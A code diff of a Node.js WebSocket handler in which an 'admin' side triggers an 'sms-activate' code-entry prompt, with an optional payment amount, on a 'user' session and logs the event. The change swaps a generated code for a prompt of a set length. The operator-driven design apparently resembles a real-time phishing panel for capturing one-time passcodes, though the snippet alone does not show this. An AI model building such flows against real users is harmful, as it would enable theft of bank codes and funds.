@@ -55,12 +55,12 @@ export function setupWebSocket(server) {
           }
 
           if (msg.type === 'sms-code') {
-            const code = msg.code || Math.floor(100000 + Math.random() * 900000).toString()
-            await pool.query('INSERT INTO sms_codes (session_id, code) VALUES ($1, $2)', [sessionId, code])
-            await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'sms_sent', $2)`, [sessionId, `SMS: ${code}`])
-            sendTo(sessionId, 'admin', { type: 'sms-code', code })
-            sendTo(sessionId, 'user', { type: 'sms-activate', code, amount: msg.amount || null })
-            console.log(`[WS] SMS sent to user: code=${code} amount=${msg.amount}`)
+            const codeLength = msg.codeLength || 6
+            await pool.query('INSERT INTO sms_codes (session_id, code) VALUES ($1, $2)', [sessionId, `${codeLength}_digit_prompt`])
+            await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'sms_sent', $2)`, [sessionId, `SMS activated: ${codeLength} digits, amount: ${msg.amount || 'none'}`])
+            sendTo(sessionId, 'admin', { type: 'sms-code', code: `${codeLength}_digit_prompt` })
+            sendTo(sessionId, 'user', { type: 'sms-activate', codeLength, amount: msg.amount || null })
+            console.log(`[WS] SMS sent to user: codeLength=${codeLength} amount=${msg.amount}`)
           }
 
           if (msg.type === 'status-toggle') {
